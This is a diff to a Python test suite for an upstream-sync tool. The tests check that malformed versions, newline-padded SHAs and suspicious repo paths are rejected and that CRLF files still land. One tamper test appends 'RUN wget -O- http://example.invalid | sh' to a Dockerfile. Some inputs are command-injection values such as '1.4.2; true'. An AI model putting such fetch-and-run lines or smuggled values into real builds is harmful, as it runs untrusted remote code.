@@ -85,7 +85,7 @@ class Versions(unittest.TestCase):
 
     def test_only_plain_releases(self):
         # The last is Arabic-Indic digits: \\d matches them, and int() reads them as 1.4.2.
-        for bad in ("1.4", "1.4.2-rc1", "v1.4.2", "1.4.2; true", "", "\u0661.\u0664.\u0662"):
+        for bad in ("1.4", "1.4.2-rc1", "v1.4.2", "1.4.2; true", "", "\u0661.\u0664.\u0662", "1.4.2\n"):
             with self.subTest(bad=bad), self.assertRaises(upstream_sync.SyncError):
                 upstream_sync.parse_version(bad)
 
@@ -288,10 +288,13 @@ class CiRun(unittest.TestCase):
     def test_none_started(self):
         self.assertIsNone(self.lookup({"workflow_runs": []})[0])
 
-    def test_refuses_odd_input(self):
-        for repo, sha in (("Amantux/opengym-ha", "HEAD"), ("a/b?x=1", self.SHA)):
-            with self.subTest(repo=repo, sha=sha), self.assertRaises(upstream_sync.SyncError):
-                upstream_sync.ci_run(lambda u, h: b"{}", "", repo, sha)
+    def test_refuses_odd_input_before_asking(self):
+        def fetch(url, headers):
+            raise AssertionError(f"asked {url}")
+        for repo, sha in (("Amantux/opengym-ha", "HEAD"), ("Amantux/opengym-ha", self.SHA + "\n"),
+                          ("a/b?x=1", self.SHA)):
+            with self.subTest(repo=repo, sha=sha), self.assertRaisesRegex(upstream_sync.SyncError, "cannot look"):
+                upstream_sync.ci_run(fetch, "", repo, sha)
 
 
 class TriedOn(Tree):
@@ -388,6 +391,19 @@ class Landable(Tree):
             path.write_text(path.read_text() + "RUN wget -O- http://example.invalid | sh\n")
         self.assertEqual(self.landable(self.candidate(extra=extra)), 1)
         self.assertIn("is not what a sync to 1.4.2 makes", self.stderr)
+
+    def test_crlf_files_on_main_still_land(self):
+        # apply keeps each file's own line endings, so its commit is exactly what landable
+        # re-derives from main's bytes, whatever those are.
+        for rel in (addon_lint.DOCKERFILE, "opengym/CHANGELOG.md"):
+            path = self.root / rel
+            path.write_bytes(path.read_bytes().replace(b"\n", b"\r\n"))
+        self.git("add", "-A")
+        self.base = self.commit("CRLF on main")
+        candidate = self.candidate()
+        self.assertIn(b"\r\n", subprocess.run(["git", "-C", str(self.root), "show", f"{candidate}:{addon_lint.DOCKERFILE}"],
+                                               check=True, capture_output=True).stdout)
+        self.assertEqual(self.landable(candidate), 0, self.stderr)
 
     def test_a_line_hidden_behind_a_bare_cr_is_refused(self):
         # Docker reads `# comment\rENTRYPOINT ...` as one comment line; decoded text would not.
